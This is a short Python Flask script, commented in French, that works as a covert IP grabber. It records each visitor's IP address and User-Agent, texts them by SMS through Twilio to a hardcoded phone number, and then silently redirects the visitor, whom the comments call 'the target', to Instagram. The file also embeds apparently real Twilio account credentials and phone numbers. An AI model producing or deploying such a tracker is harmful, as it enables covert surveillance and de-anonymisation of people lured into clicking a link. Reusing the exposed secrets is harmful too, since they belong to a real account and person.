from flask import Flask, request, redirect
from twilio.rest import Client

app = Flask(__name__)

# Remplace par tes informations Twilio
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'  # Ton Account SID (Trouvé dans la console Twilio)
auth_token = 'ec746c04233667b9836c82d9512a9ee9'  # Ton Auth Token (Trouvé dans la console Twilio)
client = Client(account_sid, auth_token)

# Numéro Twilio et destinataire
from_phone_number = '+12524866318'  # Ton numéro Twilio
to_phone_number = '+33635960569'  # Le numéro de téléphone où tu veux recevoir les SMS (remplace par ton propre numéro)

def send_sms(ip_address, user_agent):
    body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
    try:
        message = client.messages.create(
            body=body,
            from_=from_phone_number,
            to=to_phone_number
        )
        print(f"Message sent: {message.sid}")
    except Exception as e:
        print(f"Error sending SMS: {e}")

@app.route('/')
def index():
    ip_address = request.remote_addr  # Récupère l'adresse IP de la cible
    user_agent = request.headers.get('User-Agent')  # Récupère le User-Agent de la cible
    print(f"IP: {ip_address}, User-Agent: {user_agent}")  # Affiche dans la console

    # Envoie un SMS avec l'IP et User-Agent
    send_sms(ip_address, user_agent)

    # Redirige vers une image ou une page (exemple ici avec une image)
    return redirect("https://www.instagram.com")  # Remplace par ton URL d'image

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
